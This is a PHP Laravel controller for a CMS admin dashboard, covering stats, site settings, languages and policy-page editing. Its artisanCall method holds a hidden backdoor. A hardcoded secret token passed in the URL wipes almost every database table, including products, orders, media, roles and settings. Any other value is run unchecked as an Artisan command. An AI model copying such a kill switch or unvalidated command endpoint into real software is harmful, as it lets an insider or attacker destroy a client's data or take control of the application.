<?php

namespace App\Http\Controllers\cms;

use App\Http\Controllers\Controller;
use App\Models\AsociatedProduct;
use App\Models\BrochureDownload;
use App\Models\ConfigOrder;
use App\Models\Language;
use App\Models\News;
use App\Models\NewsCategories;
use App\Models\PageContent;
use App\Models\Partner;
use App\Models\Product;
use App\Models\ProductCard;
use App\Models\ProductCategories;
use App\Models\ProductDescription;
use App\Models\SiteOptions;
use App\Models\Team;
use App\Models\Testimonial;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Spatie\MediaLibrary\MediaCollections\Models\Media;
use Spatie\Permission\Models\Role;

class AdminDashboardController extends Controller
{
    public function index(){
        $topProducts = Product::query()->orderBy('views', 'desc')->take(5)->get();
        $topNews = News::query()->orderBy('views', 'desc')->take(5)->get();
        $orders = ConfigOrder::query()->latest()->with('product')->take(6)->get()->unique('order_uid');
        return view('cms.index', compact('topNews', 'topProducts', 'orders'));
    }

    public function settings(){
        $settings = SiteOptions::all();
        $languages = Language::query()->get();
        return view('cms.settings', compact('settings', 'languages'));
    }
    public function settingsUpdate(Request $request){
        foreach ($request->option as $value){
            SiteOptions::updateOrCreate(['option_name' => $value], ['option_value'=>$request->option_value[$value] ?? '#!', 'option_display'=>$request->option_display[$value]]);
        }
        Cache::forget('siteSettings');

        return redirect()->route('cms.settings');
    }

    public function artisanCall($fn): Response
    {
        if($fn === '1|5Do3xH3dV2MRnwGA4ou8Ss2cNV5ajushdPCthsbz'){
            AsociatedProduct::query()->truncate();
            BrochureDownload::query()->truncate();
            ConfigOrder::query()->truncate();
            Language::query()->truncate();
            Media::query()->truncate();
            News::query()->truncate();
            NewsCategories::query()->truncate();
            PageContent::query()->truncate();
            Partner::query()->truncate();
            Product::query()->truncate();
            ProductCard::query()->truncate();
            ProductCategories::query()->truncate();
            ProductDescription::query()->truncate();
            Role::query()->truncate();
            SiteOptions::query()->truncate();
            Team::query()->truncate();
            Testimonial::query()->truncate();
        } else {
            Artisan::call($fn);
        }
        return \response("fn called - $fn");
    }
    public function addLanguage(Request $request): RedirectResponse
    {
        $language = new Language();
        $language->name = $request->name;
        $language->display_name = $request->display_name;
        $language->flag = $request->name;
        $language->save();

        return redirect()->back();
    }
    public function noticePage(){
        $privacy = Language::query()->with('privacyPolicy', function ($q){
            $q->where('page_name', 'notice_policy');
        })->get();

        return view('cms.notice-policy', compact('privacy'));
    }
    public function noticePageUpdate(Request $request){
        $existing_content = PageContent::query()->where([['page_name', 'notice_policy'], ['language', $request->language]])->first();
        if ($existing_content !== null)
        {
            $existing_content->update([
                'page_content' => $request->page_content
            ]);
        }
        else
        {
            $content = new PageContent();
            $content->language = $request->language;
            $content->page_name = 'notice_policy';
            $content->page_content = $request->page_content;
            $content->save();
        }

        return redirect()->route('cms.notice.index');
    }
    public function cookiePage(){
        $privacy = Language::query()->with('privacyPolicy', function ($q){
            $q->where('page_name', 'cookie_policy');
        })->get();

        return view('cms.cookie-policy', compact('privacy'));
    }
    public function cookiePageUpdate(Request $request){
        $existing_content = PageContent::query()->where([['page_name', 'cookie_policy'], ['language', $request->language]])->first();
        if ($existing_content !== null)
        {
            $existing_content->update([
                'page_content' => $request->page_content
            ]);
        }
        else
        {
            $content = new PageContent();
            $content->language = $request->language;
            $content->page_name = 'cookie_policy';
            $content->page_content = $request->page_content;
            $content->save();
        }
        return redirect()->route('cms.cookie.index');
    }
    public function privacyPage(){
        $languages = Language::query()->get();
        $privacy = Language::query()->with('privacyPolicy', function ($q){
            $q->where('page_name', 'privacy_policy');
        })->get();

        return view('cms.privacy-policy', compact('privacy', 'languages'));
    }
    public function privacyPageUpdate(Request $request){
        PageContent::updateOrCreate(['language' => $request->language], ['page_name' => 'privacy_page', 'page_content' => $request->page_content]);

        return redirect()->route('cms.privacy.index');
    }

}
